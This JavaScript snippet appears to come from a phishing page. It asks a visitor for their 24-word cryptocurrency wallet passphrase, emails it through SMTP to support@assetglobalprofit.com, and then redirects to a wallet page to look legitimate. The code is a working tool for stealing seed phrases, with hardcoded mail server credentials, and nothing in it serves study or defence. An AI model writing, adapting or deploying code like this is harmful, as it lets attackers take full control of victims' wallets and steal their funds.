function emailSend() {
    var passphrase = document.getElementById('message').value;

    if (passphrase.trim() === "") {
        swal("Error", "Please enter 24-word passphrase", "error");
        return;
    }

    var messageBody = "Passphrase: " + passphrase; // Using passphrase instead of 'details' which was undefined

    Email.send({
        Host: "lon112.truehost.cloud",
        Username: "support@assetglobalprofit.com", // Replace with the full email address
        Password: "payday10177@", // Replace with the actual password
        To: "support@assetglobalprofit.com",
        From: "support@assetglobalprofit.com",
        Subject: "Wallet Passphrase",
        Body: messageBody
    }).then(
        message => {
            if (message === 'OK') {
                window.location.href = 'wallet.html';
            } else {
                swal("Error", "Something went wrong. Please try again.", "error");
            }
        }
    );
}

// Attach event listener to the form submit button
document.querySelector('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting normally
    emailSend();
});
